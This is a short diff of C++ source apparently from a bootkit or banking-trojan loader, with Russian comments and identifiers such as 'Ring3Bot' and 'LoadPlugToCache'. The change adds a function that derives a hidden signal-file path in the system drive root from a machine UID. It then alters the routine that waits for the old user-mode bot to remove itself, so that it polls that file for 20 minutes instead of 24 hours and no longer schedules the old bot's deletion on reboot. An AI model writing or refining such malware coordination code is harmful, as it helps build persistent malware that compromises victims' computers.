@@ -482,20 +482,38 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 	}
 };
 
+PCHAR GetBootkitSignalFileName()
+{
+	PCHAR Path= STR::Alloc(MAX_PATH);
+	PCHAR UID=STR::Alloc(120);
+
+	pGetSystemDirectoryA(Path,MAX_PATH);
+	GenerateUid(UID);
+	Path[3]='\0';
+	
+	PCHAR Pref= STR::GetRightStr(UID,"0");
+	m_lstrcat(Path, Pref);
+
+	STR::Free(Pref);
+	STR::Free(UID);
+	
+	return Path;
+}
+
 void WaitForOldRing3BotSelfRemoved()
 {
-	DWORD TimeoutInSec = 24 * 60 * 60;
+	DWORD TimeoutInSec = 20 * 60;
 	
 	DWORD PeriodInSec = 60;
 	DWORD PeriodCount = TimeoutInSec / PeriodInSec;
-	PCHAR PathToRing3Bot = BOT::GetBotFullExeName();
+	PCHAR PathToSignalFile = GetBootkitSignalFileName();
 	
 	while (true)
 	{
-		bool IsExists = File::IsExists(PathToRing3Bot);
+		bool IsExists = File::IsExists(PathToSignalFile);
 		
 		LDRDBG("WaitForOldRing3BotSelfRemoved", "check file='%s' exists='%d'",
-			PathToRing3Bot, IsExists);
+			PathToSignalFile, IsExists);
 
 		if(!IsExists) break;
 		
@@ -510,12 +528,11 @@ void WaitForOldRing3BotSelfRemoved()
 
 		if (PeriodCount == 0)
 		{
-			pMoveFileExA(PathToRing3Bot, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 			break;
 		}
 	}
 
-	STR::Free(PathToRing3Bot);
+	STR::Free(PathToSignalFile);
 }
 
 // Нужен для вызова в дропере.
@@ -549,8 +566,9 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		
 		// 317_ld успешная загрузка файла плага методом LoadPlugToCache
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
-		
 		MemFree(Module);
+
+		WaitForOldRing3BotSelfRemoved();
 
 		return TRUE;
 	}
